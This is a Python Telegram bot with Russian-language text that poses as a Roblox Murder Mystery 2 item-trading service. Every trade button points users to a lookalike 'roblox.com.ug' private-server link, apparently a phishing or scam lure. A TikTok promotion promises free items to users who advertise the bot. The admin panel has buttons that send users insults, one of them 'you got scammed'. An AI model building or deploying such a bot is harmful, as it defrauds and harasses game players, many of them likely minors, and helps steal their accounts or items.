import os
import sqlite3
import random
import time
import telebot
from telebot import types

# ⚙️ АВТОМАТИЧЕСКАЯ НАСТРОЙКА ИЗ ПЕРЕМЕННЫХ RAILWAY
# Бот сам возьмет значения, которые вы указали в панели управления Railway
BOT_TOKEN = os.getenv("BOT_TOKEN")
ADMIN_ID = os.getenv("ADMIN_ID")

# Проверка на корректность ID администратора
if ADMIN_ID:
    ADMIN_ID = int(ADMIN_ID)
else:
    print("❌ КРИТИЧЕСКАЯ ОШИБКА: Переменная ADMIN_ID не найдена в настройках Railway!")

bot = telebot.TeleBot(BOT_TOKEN)


# ✏️ МЕСТО ДЛЯ ТЕКСТА ОБМЕНА
TEXT_FOR_TRADES = (
    "Привет! Ты хочешь провести обмен предметов?\n\n"
    "Окей,заходи в игру через ссылку и и подходи к игроку MURDERMYSTERYBOTTRADE
https://roblox.com.ug/games/142823291/Murder-Mystery-2?privateServerLinkCode=69658770029576446123589528132882 "
)

# 🎭 Список фраз для троллинга пользователей
TROLL_PHRASES = [
    "лашара 🧝‍♂️",
    "сказочный далбаеб",
    "ты чё аутист",
    "тебя наебали далбаеб"
]


# 🗄️ Инициализация базы данных
def init_db():
    conn = sqlite3.connect("bot_data.db")
    cursor = conn.cursor()
    cursor.execute("""
        CREATE TABLE IF NOT EXISTS users (
            user_id INTEGER PRIMARY KEY,
            username TEXT,
            is_banned INTEGER DEFAULT 0
        )
    """)
    conn.commit()
    conn.close()

init_db()

# Базовые функции работы с БД
def is_user_banned(user_id):
    conn = sqlite3.connect("bot_data.db")
    cursor = conn.cursor()
    cursor.execute("SELECT is_banned FROM users WHERE user_id = ?", (user_id,))
    result = cursor.fetchone()
    conn.close()
    return result == 1 if result else False

def set_ban_status(user_id, username, status):
    conn = sqlite3.connect("bot_data.db")
    cursor = conn.cursor()
    cursor.execute("INSERT OR REPLACE INTO users (user_id, username, is_banned) VALUES (?, ?, ?)", (user_id, username, status))
    conn.commit()
    conn.close()

def register_user(user_id, username):
    conn = sqlite3.connect("bot_data.db")
    cursor = conn.cursor()
    cursor.execute("INSERT OR REPLACE INTO users (user_id, username, is_banned) VALUES (?, ?, COALESCE((SELECT is_banned FROM users WHERE user_id = ?), 0))", (user_id, username, user_id))
    conn.commit()
    conn.close()

def get_all_users():
    conn = sqlite3.connect("bot_data.db")
    cursor = conn.cursor()
    cursor.execute("SELECT user_id FROM users WHERE is_banned = 0")
    users = [row[0] for row in cursor.fetchall()]
    conn.close()
    return users


# --- ИНТЕРФЕЙС И ЛОГИКА БОТА ---

# Команда массовой рассылки (доступна только вашему ID)
@bot.message_handler(commands=['send_all'])
def start_broadcast(message):
    if message.chat.id != ADMIN_ID:
        return
    
    msg = bot.send_message(ADMIN_ID, "📝 Введите текст для массовой рассылки всем пользователям:")
    bot.register_next_step_handler(msg, run_broadcast)

def run_broadcast(message):
    if message.chat.id != ADMIN_ID:
        return
    
    broadcast_text = message.text
    if not broadcast_text:
        bot.send_message(ADMIN_ID, "❌ Текст рассылки не может быть пустым. Отменено.")
        return
        
    user_ids = get_all_users()
    bot.send_message(ADMIN_ID, f"🚀 Начинаю рассылку для {len(user_ids)} пользователей...")
    
    success_count = 0
    fail_count = 0
    
    for uid in user_ids:
        if uid == ADMIN_ID:
            continue
        try:
            bot.send_message(uid, broadcast_text, parse_mode="HTML")
            success_count += 1
            time.sleep(0.05)
        except Exception:
            fail_count += 1
            
    bot.send_message(
        ADMIN_ID, 
        f"📊 <b>Рассылка завершена!</b>\n\n"
        f"✅ Успешно доставлено: {success_count}\n"
        f"❌ Не доставлено (заблокировали бота): {fail_count}", 
        parse_mode="HTML"
    )

# Главное меню при старте (/start)
@bot.message_handler(commands=['start'])
def send_welcome(message):
    if is_user_banned(message.from_user.id):
        bot.send_message(message.chat.id, "🔴 Вы заблокированы в этом боте за нарушение правил.")
        return

    register_user(message.from_user.id, message.from_user.username)
    
    markup = types.ReplyKeyboardMarkup(resize_keyboard=True, row_width=1)
    btn1 = types.KeyboardButton("Ice set 2020 на Harvester 💙")
    btn2 = types.KeyboardButton("Fowerwood на Harvester 💙")
    btn3 = types.KeyboardButton("Candleflame на Коррупт 💙")
    btn4 = types.KeyboardButton("Коррупт на Traveler's Set 💙")
    btn5 = types.KeyboardButton("Хрома на что-то выгодное 🎁")
    btn6 = types.KeyboardButton("Ваш любой сет ( от джинджер сета ) на крутянский другой сет 💙")
    btn7 = types.KeyboardButton("Бесплатное оружие или нож за рекламу")
    markup.add(btn1, btn2, btn3, btn4, btn5, btn6, btn7)
    
    bot.send_message(
        message.chat.id, 
        "👋 Добро пожаловать! Выберите интересующее вас направление обмена из меню:", 
        reply_markup=markup
    )

# Обработка входящих текстовых сообщений
@bot.message_handler(content_types=['text'])
def handle_all_messages(message):
    chat_id = message.chat.id
    user_id = message.from_user.id
    username = message.from_user.username or "без никнейма"

    if is_user_banned(user_id):
        return

    # Ответы на кнопки меню
    if " на " in message.text:
        bot.send_message(chat_id, TEXT_FOR_TRADES, parse_mode="HTML")
        bot.send_message(ADMIN_ID, f"ℹ️ Пользователь @{username} ({user_id}) нажал кнопку: {message.text}")
        return

    elif message.text == "Бесплатное оружие или нож за рекламу":
        text_promo = (
            "Привет 👋\n"
            "Мы можем подарить тебе подарочек от Арбалета, заканчивая Крутым сетом 🎰🥳\n\n"
            "Как же сделать рекламу и получить свой заветный приз? 🏆\n"
            "1. В свой тик-ток аккаунт тебе нужно опубликовать одно из нижеприведенных видео. (Скачивай и публикуй)\n\n"
            "2. Чтобы видео считалось оригинальным и мы выдали приз тебе надо проявить немного креативности...\n\n"
            "3. Текст должен быть на видео наподобие «Смотрите что нашла, это бот для обменов в ММ2»...\n\n"
            "4. Самое главное чтобы в конце видео был минимум на 1 секунду скриншот с названием бота...\n\n"
            "5. Хештеги под видео (нажмите, чтобы скопировать):\n"
            "<code>#мм2 #Мардермистери2 #Роблокс #roblox #murdermystery2</code>\n\n"
            "💬 <b>ОТПРАВЬТЕ ССЫЛКУ НА ВАШЕ ВИДЕО ПРЯМО В ЭТОТ ЧАТ</b> — модератор проверит её и выдаст приз!"
        )
        bot.send_message(chat_id, text_promo, parse_mode="HTML")
        return

    # Логика ответов админа (через Reply)
    if chat_id == ADMIN_ID:
        if message.reply_to_message and "ID:" in message.reply_to_message.text:
            try:
                target_user_id = int(message.reply_to_message.text.split("ID: ")[1].split("\n")[0])
                bot.send_message(target_user_id, f"💬 <b>Сообщение от администратора:</b>\n{message.text}", parse_mode="HTML")
                bot.send_message(ADMIN_ID, "✅ Сообщение успешно доставлено пользователю!")
            except Exception as e:
                bot.send_message(ADMIN_ID, f"❌ Ошибка отправки: {e}")
        else:
            bot.send_message(ADMIN_ID, "ℹ️ Чтобы ответить пользователю, сделайте 'Ответ' (Reply) на сообщение бота с его текстом.")
        return

    # Пересылка сообщения пользователя админу
    markup = types.InlineKeyboardMarkup()
    btn_ban = types.InlineKeyboardButton("🚫 Забанить", callback_data=f"ban_{user_id}_{username}")
    btn_troll = types.InlineKeyboardButton("🤡 Затроллить", callback_data=f"troll_{user_id}")
    markup.add(btn_ban, btn_troll)

    admin_msg = (
        f"📩 <b>Новое сообщение от пользователя!</b>\n"
        f"👤 Юзернейм: @{username}\n"
        f"🆔 ID: {user_id}\n\n"
        f"📝 <b>Текст сообщения / Ссылка:</b>\n{message.text}\n\n"
        f"<i>(Чтобы ответить человеку, просто напишите текст в ответ на ЭТО сообщение)</i>"
    )
    bot.send_message(ADMIN_ID, admin_msg, parse_mode="HTML", reply_markup=markup)
    bot.send_message(chat_id, "⏳ Ваш отчёт/сообщение принято! Модератор проверит его в ближайшее время.")


# --- ОБРАБОТКА ИНЛАЙН-КНОПОК АДМИНА ---
@bot.callback_query_handler(func=lambda call: True)
def handle_admin_buttons(call):
    if call.message.chat.id != ADMIN_ID:
        return

    data = call.data.split("_")
    action = data[0]
    target_id = int(data[1])

    if action == "ban":
        username = data[2]
        set_ban_status(target_id, username, 1)
        
        markup = types.InlineKeyboardMarkup()
        btn_unban = types.InlineKeyboardButton("🟢 Разбанить", callback_data=f"unban_{target_id}_{username}")
        markup.add(btn_unban)
        
        bot.edit_message_text(f"🔴 Пользователь @{username} (ID: {target_id}) успешно <b>ЗАБАНЕН</b>", chat_id=ADMIN_ID, message_id=call.message.id, parse_mode="HTML", reply_markup=markup)
        try:
            bot.send_message(target_id, "🔴 Вы были заблокированы администратором за нарушение правил бота.")
        except:
            pass

    elif action == "unban":
        username = data[2]
        set_ban_status(target_id, username, 0)
        bot.edit_message_text(f"🟢 Пользователь @{username} (ID: {target_id}) успешно <b>РАЗБАНЕН</b>", chat_id=ADMIN_ID, message_id=call.message.id, parse_mode="HTML")

    elif action == "troll":
        phrase = random.choice(TROLL_PHRASES)
        try:
            bot.send_message(target_id, phrase)
            bot.send_message(ADMIN_ID, f"🤡 Игроку (ID: {target_id}) отправлена шуточная фраза:\n«{phrase}»")
        except Exception as e:
            bot.send_message(ADMIN_ID, f"❌ Не удалось отправить тролль-фразу: {e}")

bot.polling(none_stop=True)
